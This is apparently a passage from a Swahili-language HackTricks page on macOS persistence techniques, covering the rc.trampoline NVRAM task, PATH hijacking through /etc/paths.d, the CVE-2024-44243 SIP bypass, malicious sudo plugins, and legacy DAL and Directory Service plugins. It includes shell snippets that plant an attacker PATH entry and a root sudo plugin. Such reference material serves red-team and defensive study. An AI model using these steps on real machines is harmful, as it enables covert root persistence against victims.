Kazi ya kuwasha ya `rc.trampoline` huendesha **binary ya platform (iliyosainiwa na Apple)** iliyohifadhiwa kwenye kigezo cha NVRAM cha `apple-trusted-trampoline` wakati wa kuwasha, lakini **ni pale tu hoja ya kuwasha `rc.trampoline=1` imewekwa na SIP imezimwa** (ikiwa na kikomo cha ukubwa cha takriban KB 390 na sharti la kuzuia/kurejea haraka). Kwa kuwa inahitaji **root + SIP ikiwa imezimwa + payload iliyosainiwa na Apple**, kimsingi haiwezekani kuitumia kwa persistence katika hali halisi, na imeorodheshwa hapa kwa ukamilifu tu.<sup>[[41]](#references)</sup>

### /etc/paths and /etc/paths.d (PATH hijack)

- Inafaa kwa kupita sandbox: [🔴](https://emojipedia.org/large-red-circle) (inahitajika root ili kuandika)
- Inahitaji root

#### Mahali

- **`/etc/paths`** na **`/etc/paths.d/*`** — husomwa na **`path_helper`** (inayoitwa kutoka `/etc/zprofile`) ili kuunda `PATH` chaguomsingi wakati wa kuingia.

#### Maelezo na Exploitation

Vyote vinamilikiwa na root. Kuweka saraka inayodhibitiwa na mshambuliaji mbele (kwa kuhariri `/etc/paths` au kuweka faili ndani ya `/etc/paths.d/`) hufanya saraka hiyo ionekane mapema kwenye `PATH` ya kila shell mpya ya kuingia, kwa hiyo binary hasidi iliyopewa jina la amri ya kawaida (`ls`, `git`, …) **hufunika** ile halisi na huendeshwa wakati mwathiriwa atakapoitekeleza tena.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Inafaa kwa kubypass sandbox: [🔴](https://emojipedia.org/large-red-circle) (inahitajika root)
- Root inahitajika; matokeo yake **hupita SIP**. macOS zilizoathirika ni **15.0–15.1**, na tatizo lilirekebishwa katika **15.2**

#### Mahali

- Weka filesystem bundle ndani ya **`/Library/Filesystems/`**.

#### Maelezo na Utekelezaji

`storagekitd` ina entitlement **`com.apple.rootless.install.heritable`** na ilizindua binary za filesystem bundles zikiwa na uwezo huo wa kubypass SIP **uliorithiwa**. Kwa kuweka filesystem bundle hasidi, mshambuliaji angeweza kutekeleza code inayobypass SIP ili kusakinisha **kernel extensions zinazoendelea kuwepo** au kuandika katika saraka za `LaunchDaemon` zinazolindwa na SIP — persistence hii huendelea na kushinda ulinzi wa kawaida.<sup>[[46]](#references)</sup> Apple ilirekebisha tatizo hili katika macOS Sequoia 15.2.

### sudo plugins (/etc/sudo.conf)

Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Inafaa kwa kubypass sandbox: [🔴](https://emojipedia.org/large-red-circle) (root inahitajika ili kuandika `/etc/sudo.conf`)
- Root inahitajika ili kusakinisha; kisha plugin huendeshwa ndani ya **kila utekelezaji wa `sudo`** (muktadha wa setuid-root)

#### Mahali

- **`/etc/sudo.conf`** — mistari ya `Plugin` hupakia shared objects kutoka **`/usr/libexec/sudo/`** (au njia kamili). Haipo kwa chaguomsingi (sudo hutumia policy iliyojengewa ndani), kwa hiyo kuiunda ni njia safi ya kuweka hook.

#### Maelezo na Utekelezaji

`sudo` hupakia plugins zake za policy/approval/audit kutoka `/etc/sudo.conf`. Kwa kuwa `sudo` ni setuid-root, plugin hasidi ya shared-object hutekelezwa ikiwa na **haki za root kila mtumiaji anapoendesha `sudo`** — persistence ya root inayodumu na pia kuona kila amri ya sudo.<sup>[[51]](#references)</sup> macOS huja na sudo 1.9.x inayotumia plugin API.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Mfano mdogo: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Utaratibu wa zamani:** Umeacha kutumika tangu macOS 12.3. macOS 14.1 na matoleo ya baadaye huzima video plug-ins za zamani kwa chaguo-msingi. Mtumiaji lazima arejeshe usaidizi wa video za zamani kutoka Recovery ili njia hii iweze kufanya kazi; kuwa na saraka inayoweza kuandikika pekee hakutoshi. [Mwongozo wa sasa wa usaidizi wa Apple](https://support.apple.com/en-us/108387).
- Root inahitajika ili kuandika kwenye saraka ya plug-in. Utekelezaji wowote wa msimbo unategemea mteja anayeoana ambaye bado hupakia DAL plug-ins; hili halikujaribiwa wakati wa utekelezaji kwenye macOS 26.

#### Mahali

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Root inahitajika
  - **Kichocheo:** Mteja wa kamera anayeoana hutafuta vifaa **baada ya usaidizi wa zamani kurejeshwa**. Uthibitishaji wa maktaba wa mteja unaweza kuzuia plug-in ya mtu mwingine.

#### Maelezo na Unyonyaji

DAL (Device Abstraction Layer) plug-ins za CoreMediaIO zilipakiwa ndani ya mchakato na baadhi ya programu za kamera. [Wasilisho la Apple kuhusu camera extension](https://developer.apple.com/videos/play/wwdc2022/10022/) linasema wazi kuwa DAL plug-ins za zamani **hazikufanya kazi** na FaceTime, QuickTime Player, au Photo Booth, na kwamba wateja wengine wengi hutekeleza uthibitishaji wa maktaba. [Core Media I/O extensions](https://developer.apple.com/documentation/coremediaio) za kisasa hufanya kazi nje ya mchakato, kwa mfumo tofauti wa usakinishaji na idhini. Mbinu hii ya zamani ya ndani ya mchakato haimaanishi kuwa kuna njia ya jumla ya kukwepa Camera TCC kwenye macOS ya sasa.<sup>[[53]](#references)[[54]](#references)</sup>

Uchunguzi wa kusoma pekee kwenye macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` ipo na inamilikiwa na root. Hakukuthibitishwa kama usaidizi wa zamani ulikuwa umewashwa au kama plug-in ilipakiwa na mteja yeyote.

### Directory Service Plugins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Utaratibu wa zamani, wenye masharti:** Unahitaji root ili kusakinisha, na plug-in ambayo imesanidiwa na kupakiwa kwa hakika. API ya plug-in ya DirectoryService imeacha kutumika; kagua usanidi wa Open Directory kwenye Mac lengwa kabla ya kuchukulia hili kama kichocheo cha kuwasha mfumo.

#### Mahali

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Root inahitajika
  - **Kichocheo:** `dspluginhelperd` hupakia plug-in inayokidhi masharti na kusanidiwa wakati Open Directory inapohitaji. [Mwongozo wa Apple wa mazingira ya utekelezaji wa plug-in](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) unasema plug-ins ambazo hazijasanidiwa kuwashwa wakati wa kuanzisha mfumo zinaweza kupakiwa kwa kuchelewa nodi yake inapofunguliwa.

#### Maelezo na Unyonyaji

`dspluginhelperd` hutumia legacy DirectoryService plug-in bundles. Plug-in hasidi inaweza kuwa njia ya utekelezaji yenye mamlaka ya juu ikiwa plug-in ya zamani itakubaliwa na kuwashwa; njia hii ni tofauti na PAM na Authorization Plugins. Kuwepo kwa saraka hakuthibitishi kuwa plug-in iliyoandikwa humo itatekelezwa mfumo utakapowashwa tena. Mwongozo wa ndani wa Apple `dspluginhelperd(8)` na `opendirectoryd(8)` kwenye macOS 26.5 bado unaorodhesha helper na njia hii ya zamani.<sup>[[53]](#references)</sup>

Uchunguzi wa kusoma pekee kwenye macOS 26: `/Library/DirectoryServices/PlugIns` na `/usr/libexec/dspluginhelperd` zipo. Hakuna plug-in iliyosakinishwa, kusanidiwa, au kupakiwa wakati wa jaribio hili.

## Mbinu na zana za Persistence

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, mwaka wa Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Zaidi ya LaunchAgents za kawaida - 1 - faili za kuanzisha shell](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Zaidi ya LaunchAgents za kawaida - 18 - X11 na XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Zaidi ya LaunchAgents za kawaida - 21 - Programu zilizofunguliwa tena](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Zaidi ya LaunchAgents za kawaida - 20 - Mapendeleo ya Terminal](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Zaidi ya LaunchAgents za kawaida - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Zaidi ya LaunchAgents za kawaida - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Zaidi ya LaunchAgents za kawaida - 22 - LoginHook na LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Zaidi ya LaunchAgents za kawaida - 4 - cron jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Zaidi ya LaunchAgents za kawaida - 2 - uanzishaji wa iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Zaidi ya LaunchAgents za kawaida - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Zaidi ya LaunchAgents za kawaida - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Zaidi ya LaunchAgents za kawaida - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Zaidi ya LaunchAgents za kawaida - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Zaidi ya LaunchAgents za kawaida - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Zaidi ya LaunchAgents za kawaida - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Folder Actions za kudumisha uwepo kwenye macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Zaidi ya LaunchAgents za kawaida - 27 - njia za mkato za Dock](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Zaidi ya LaunchAgents za kawaida - 17 - Color Pickers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Zaidi ya LaunchAgents za kawaida - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Kuchanganua persistence ya "Mac File Opener" (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Zaidi ya LaunchAgents za kawaida - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Kuhifadhi ufikiaji wako: Screen saver za persistence kwenye macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Zaidi ya LaunchAgents za kawaida - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Zaidi ya LaunchAgents za kawaida - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Zaidi ya LaunchAgents za kawaida - 19 - hati za Periodic](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Zaidi ya LaunchAgents za kawaida - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Zaidi ya LaunchAgents za kawaida - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Wizi wa kudumu wa vitambulisho kupitia Authorization Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Zaidi ya LaunchAgents za kawaida - 30 - Faili ya usanidi ya man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Zaidi ya LaunchAgents za kawaida - 25 - Apache2 modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Zaidi ya LaunchAgents za kawaida - 31 - mfumo wa ukaguzi wa BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Zaidi ya LaunchAgents za kawaida - 23 - emond, daemon ya ufuatiliaji wa matukio](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Zaidi ya LaunchAgents za kawaida - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Zaidi ya LaunchAgents za kawaida - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Zaidi ya LaunchAgents za kawaida - 10 - faili za hati za programu](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Zaidi ya LaunchAgents za kawaida - 32 - Dock Tile Plugins](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Zaidi ya LaunchAgents za kawaida - 33 - Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Zaidi ya LaunchAgents za kawaida - 34 - kazi za kuwasha mfumo za launchd](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Zaidi ya LaunchAgents za kawaida - 35 - Kudumisha uwepo kupitia NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Kutumia barua pepe kudumisha uwepo kwenye OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Marekebisho ya kutia shaka ya Apple Mail Rule Plist (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Profiles hasidi - mojawapo ya vitisho vikubwa zaidi kwa Mac (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Sanaa ya Mac Malware Juz. 1 - Sura ya 0x2 Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Kuchanganua CVE-2024-44243, njia ya kukwepa SIP ya macOS kupitia kernel extensions (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE na uchujaji wa API Token kupitia faili za mradi wa Claude Code (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Athari mpya katika GitHub Copilot na Cursor - mlango wa nyuma wa Rules File (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - Mbinu mbadala za usakinishaji (External Extensions)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Kuondoa ExtensionInstallForcelist katika Chrome kwenye Mac (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Kuhusu kuandika Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Unyonyaji wa Mac kwa mbali kupitia Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Mbinu mbili za macOS persistence zinazotumia vibaya plugins (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Mfano mdogo wa CoreMediaIO DAL (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Kuchanganua athari ya macOS TCC inayotegemea Spotlight (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Nyaraka za Python `site` module (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
